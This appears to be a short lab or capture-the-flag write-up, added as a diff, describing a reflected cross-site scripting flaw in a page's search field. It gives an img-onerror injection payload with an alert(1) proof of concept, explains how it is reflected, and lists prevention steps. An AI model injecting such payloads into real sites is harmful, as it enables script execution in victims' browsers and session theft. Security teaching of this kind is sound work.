@@ -1,0 +1,21 @@
+Vulnerability:
+	The page reflects the user input unsanitized.
+	Allowing an attacker to inject and execute JS.
+	
+Exploit:
+	Example:
+		<img src="x" onerror="[PAYLOAD]">
+	
+	Exploit Script:
+		<img src="x" onerror="alert(1)">
+	
+Explanation:
+	The search input is reflected in a span with an id="searchMessage":
+		<span id="searchMessage">[REFLECTS HERE]</span>
+	So by injecting: "<img src="x" onerror="alert(1)">" it will be reflected like so:
+		<span id="searchMessage"><img src="x" onerror="alert(1)"></span>
+	
+Prevention:
+	- Sanitize the input.
+	- Do not allow inputing any tags and encode special characters.
+	- Whitelist the search input values.
